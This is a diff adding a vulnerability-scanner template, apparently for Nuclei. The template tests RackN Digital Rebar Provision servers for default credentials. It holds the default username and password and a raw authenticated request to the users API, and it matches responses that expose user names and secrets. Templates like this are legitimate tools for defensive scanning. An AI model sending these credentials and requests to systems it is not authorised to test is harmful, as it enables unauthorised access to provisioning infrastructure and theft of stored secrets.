@@ -1,0 +1,38 @@
+id: digitalrebar-provision-default-login
+info:
+  author: c-sh0
+  name: RackN Digital Rebar provision default login
+  reference:
+  - https://docs.rackn.io/en/latest/doc/faq-troubleshooting.html?#what-are-the-default-passwords
+  severity: high
+  tags: rackn,digitalrebar,default-login
+requests:
+- attack: pitchfork
+  matchers:
+  - status:
+    - 200
+    type: status
+  - part: header
+    type: word
+    words:
+    - X-Drp-
+  - condition: and
+    part: body
+    type: word
+    words:
+    - Name
+    - Secret
+  matchers-condition: and
+  payloads:
+    password:
+    - r0cketsk8ts
+    username:
+    - rocketskates
+  raw:
+  - 'GET /api/v3/users HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Authorization: Basic {{base64(username + '':'' + password)}}
+
+    '
